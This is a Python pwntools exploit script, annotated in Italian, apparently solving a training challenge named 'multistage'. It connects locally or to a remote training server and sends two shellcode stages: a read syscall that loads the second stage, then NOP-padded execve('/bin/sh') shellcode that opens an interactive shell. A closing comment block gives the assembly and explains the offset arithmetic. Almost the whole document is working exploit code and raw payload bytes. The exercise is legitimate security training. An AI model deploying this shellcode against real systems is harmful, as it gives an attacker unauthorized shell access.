from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

 # 0040123f è l'indirizzo del jmp del return del main (lo vedo da Ghidra) e dopo aver messo il breakpoint da gdb vedo che in rax è contenuto il buffer
if "REMOTE" not in args:
    r = process("./multistage")
    gdb.attach(r,'''
        b * 0x0040123f
        c
    ''')
    #input("wait")
else:
    r = remote("bin.training.offdef.it", 2003)

input("wait")
r.send(b"\x48\x89\xC6\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC2\xFF\x00\x00\x00\x0F\x05") #PRIMO SHELLCODE

input("wait")
nop = b"\x90" * 18 #senza i nope andrebbe in segmentation fault (e Got EOF while reading in interactive) oppure se ne metto pochi potrebbe non eseguire alcune istruzioni dello shellcode successivo. Dipende dal fatto che la read contiene uno shellcode lungo 18: se avessi messo uno shellcode di 20 allora avrei dovuto mettere 20 nop. Se metto meno nop mi mangia un pezzo di /bin/sh e questo è dovuto sempre ad un discorso di offset. Infatti se metto un offset sbagliato anche nello shellcode si mangia un pezzo di /bin/sh 
shellcode_vecchio = b"\x48\x89\xF7\x48\x83\xC7\x28\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05/bin/sh\x00"
shellcode_completo = nop + shellcode_vecchio #SECONDO SHELLCODE

r.send (shellcode_completo)

r.interactive()

'''
Per il primo shellcode guardo alla read sul man di syscall
PRIMO SHELLCODE = 
mov rsi, rax      # rax contiene il buffer e lo mettiamo in rsi
xor rax, rax      # rax = 0 
xor rdi, rdi      # rdi = 0; rdi contiene il file descriptor e per stdin e stdout va bene mettere 0
mov rdx, 0xff     # rdx è il size_count quindi mettiamo una grandezza per lo shellcode successivo
syscall
.byte 0x0    
nop          
nop
nop
nop

Per il secondo shellcode guardo all'execve sul man di syscall (quì metto rsi e rdx uguali a 0 mentre su backtoshell non lo facevo perchè su backtoshell i registri venivano già settati a 0, mentre in multistage devo settare io a 0 quelli richiesti da execve nel man syscall)
SECONDO SHELLCODE = 

mov rdi, rsi    # rsi che contiene il buffer lo mettiamo in rdi 
add rdi, 40     # 22 (il suo offset) + 18 (l'offset dell'altro shellcode) perchè questo shellcode inizia dopo la syscall dell'altro shellcode quindi nel conto dell'offset si parte dall'inizio dell'altro shellcode
mov rax, 0x3b   # rax contiene 0x3b come richiesto dalla execve 
xor rsi, rsi    # rsi = 0
xor rdx, rdx    # rdx = 0
syscall
.byte 0x0     
nop         
nop
nop
nop

ALLA FINE PER FARE ls IN LOCALE DOVREI TOGLIERE IL BREAKPOINT DI GDB A RIGA 9 (MA COMUNQUE, TENENDO IL BREAKPOINT, DALLO SCORRIMENTO DI GDB CON I COMANDI si o c VEDO CHE NON CI SONO ERRORI)
'''